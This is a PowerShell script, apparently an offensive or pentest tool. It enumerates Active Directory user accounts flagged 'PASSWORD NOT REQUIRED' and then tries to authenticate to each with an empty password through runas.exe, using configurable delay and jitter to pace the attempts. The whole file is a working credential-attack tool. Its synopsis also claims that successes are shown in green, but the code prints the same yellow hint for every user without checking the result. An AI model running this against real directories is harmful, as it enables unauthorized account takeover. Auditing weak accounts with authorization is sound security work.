<#
.SYNOPSIS
    Enumerates all AD users with the "PASSWORD NOT REQUIRED" flag and attempts to authenticate without a password.

.DESCRIPTION
    This script queries the AD for users with the "PASSWORD NOT REQUIRED" flag set. For each user found, it attempts to authenticate without a password.
    Successful authentications are displayed in green text.

.PARAMETER Domain
    The domain to query. If not specified, the current user's domain is used.

.PARAMETER Delay
    The delay in seconds between attempts. Default is 0.

.PARAMETER Jitter
    A percentage of jitter to add randomness to the delay. Default is 0.

.PARAMETER Verbose
    Optional switch to enable verbose output.

.EXAMPLE
    .\Test-PasswordNotRequired.ps1 -Domain "example.com" -Delay 2 -Jitter 0.1 -Verbose

    This command will query the "example.com" domain for users with the "PASSWORD NOT REQUIRED" flag and attempt to authenticate without a password.
#>

param(
    [string]$Domain = "",
    [int]$Delay = 0,
    [double]$Jitter = 0,
    [switch]$Verbose
)

# Function to get users with "PASSWORD NOT REQUIRED" flag
function Get-PasswordNotRequiredUsers {
    param(
        [string]$Domain,
        [switch]$Verbose
    )

    try {
        if ($Domain -ne "") {
            # Using domain specified with -Domain option
            $DomainContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext("domain", $Domain)
            $DomainObject = [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($DomainContext)
            $CurrentDomain = "LDAP://" + ([ADSI]"LDAP://$Domain").distinguishedName
        } else {
            # Using the current user's domain
            $DomainObject = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
            $CurrentDomain = "LDAP://" + ([ADSI]"").distinguishedName
            Write-Host "Current Domain is $CurrentDomain" -Verbose:$Verbose
        }
    } catch {
        Write-Host -ForegroundColor "red" "[*] Could not connect to the domain. Try specifying the domain name with the -Domain option."
        break
    }

    Write-Host "Querying users with 'PASSWORD NOT REQUIRED' flag..." -Verbose:$Verbose
    $UserSearcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$CurrentDomain)
    $UserSearcher.Filter = "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32)(!userAccountControl:1.2.840.113556.1.4.803:=2))"
    $UserSearcher.PropertiesToLoad.Add("samaccountname") > $Null
    $UserSearcher.PageSize = 1000
    $AllUserObjects = $UserSearcher.FindAll()

    $UserListArray = @()
    foreach ($user in $AllUserObjects) {
        $samaccountname = $user.Properties.samaccountname
        $UserListArray += $samaccountname
        Write-Host "Found user: $samaccountname" -Verbose:$Verbose
    }

    return $UserListArray
}

# Function to attempt authentication with empty password using runas.exe
function Try-AuthenticateEmptyPassword {
    param(
        [string]$Domain,
        [string[]]$UserListArray,
        [int]$Delay = 0,
        [double]$Jitter = 0,
        [switch]$Verbose
    )

    $RandNo = New-Object System.Random
    $count = $UserListArray.Count
    Write-Host "[*] Now trying empty password against $count users. Current time is $(Get-Date -Format 'HH:mm:ss')" -Verbose:$Verbose

    foreach ($User in $UserListArray) {
        Write-Host "Attempting to authenticate user: $User" -Verbose:$Verbose
        $startInfo = New-Object System.Diagnostics.ProcessStartInfo
        $startInfo.FileName = "cmd.exe"
        $startInfo.Arguments = "/c echo.|runas.exe /user:$Domain\$User cmd.exe"
        $startInfo.RedirectStandardOutput = $true
        $startInfo.RedirectStandardError = $true
        $startInfo.UseShellExecute = $false
        $startInfo.CreateNoWindow = $true

        $process = New-Object System.Diagnostics.Process
        $process.StartInfo = $startInfo
        $process.Start() | Out-Null
        $process.WaitForExit()

        $output = $process.StandardOutput.ReadToEnd()
        $errorOutput = $process.StandardError.ReadToEnd()

        Write-Host -ForegroundColor Yellow "[*] If a new console has been opened as the new authenticated user $User, it worked!"

        if ($Delay) {
            Start-Sleep -Seconds $RandNo.Next((1 - $Jitter) * $Delay, (1 + $Jitter) * $Delay)
        }
    }
}

# Main script execution
$UserListArray = Get-PasswordNotRequiredUsers -Domain $Domain -Verbose:$Verbose
Try-AuthenticateEmptyPassword -Domain $Domain -UserListArray $UserListArray -Delay $Delay -Jitter $Jitter -Verbose:$Verbose

# Print a finished message in yellow
Write-Host "Script finished running." -ForegroundColor Yellow